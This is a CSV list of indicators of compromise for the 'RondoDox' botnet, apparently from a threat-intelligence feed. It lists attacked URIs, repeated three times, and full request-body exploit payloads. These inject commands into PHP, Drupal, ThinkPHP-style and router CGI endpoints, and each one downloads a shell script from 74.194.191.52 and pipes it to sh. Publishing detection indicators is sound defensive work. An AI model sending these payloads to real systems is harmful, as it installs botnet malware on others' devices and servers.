Threat,Indicator Type,Indicator
RondoDox,URI,/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh
RondoDox,URI,/cgi-bin/cgi_main.cgi
RondoDox,URI,/cgi-bin/login.cgi
RondoDox,URI,/cgi-bin/server/server.cgi?func=server02_main_submit&counter=5.22497857400916&TEST_BTN4=
RondoDox,URI,/index.php?s=captcha
RondoDox,URI,/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
RondoDox,URI,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
RondoDox,URI,/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh
RondoDox,URI,/cgi-bin/cgi_main.cgi
RondoDox,URI,/cgi-bin/login.cgi
RondoDox,URI,/cgi-bin/server/server.cgi?func=server02_main_submit&counter=5.22497857400916&TEST_BTN4=
RondoDox,URI,/index.php?s=captcha
RondoDox,URI,/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
RondoDox,URI,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
RondoDox,URI,/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh
RondoDox,URI,/cgi-bin/cgi_main.cgi
RondoDox,URI,/cgi-bin/login.cgi
RondoDox,URI,/cgi-bin/server/server.cgi?func=server02_main_submit&counter=5.22497857400916&TEST_BTN4=
RondoDox,URI,/index.php?s=captcha
RondoDox,URI,/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
RondoDox,URI,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
RondoDox,Request Body,(wget -qO- http://74.194.191.52/rondo.dgx.sh||busybox wget -qO- http://74.194.191.52/rondo.dgx.sh||curl -s http://74.194.191.52/rondo.dgx.sh)|sh&
RondoDox,Request Body,<?php system('(wget -qO- http://74.194.191.52/rondo.dtm.sh||busybox wget -qO- http://74.194.191.52/rondo.dtm.sh||curl -s http://74.194.191.52/rondo.dtm.sh)|sh&'); ?>
RondoDox,Request Body,_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=%28wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%7C%7Ccurl%20-s%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%29%7Csh
RondoDox,Request Body,cgiName=time_tzsetup.cgi&page=%2Fcfg_system_time.htm&id=69&ntp=%60curl%20-s%20http%3A%2F%2F74.194.191.52%2Frondo.qyt.sh%7Csh%60&ntp1=time.stdtime.gov.tw&ntp2=%60%60&isEnabled=0&timeDiff=%2B9&ntpAutoSync=1&ntpSyncMode=1&day=0&hour=0&min=0&syncDiff=30
RondoDox,Request Body,form_id=user_register_form&_drupal_ajax=1&mail%5B%23post_render%5D%5B%5D=exec&mail%5B%23type%5D=markup&mail%5B%23markup%5D=%28wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.bxf.sh%7C%7Ccurl%20-s%20http%3A%2F%2F74.194.191.52%2Frondo.bxf.sh%29%7Csh%26
RondoDox,Request Body,page=login&newUI=0&username=admin&password=password&hostname=localhost&ipaddr=127.0.0.1&homepage=index&sysinitpage=index&wizardpage=index&login_page=index&lang_select=0&langChange=0&key=%27%20%60wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.rtg.sh%7Csh%60%20%23
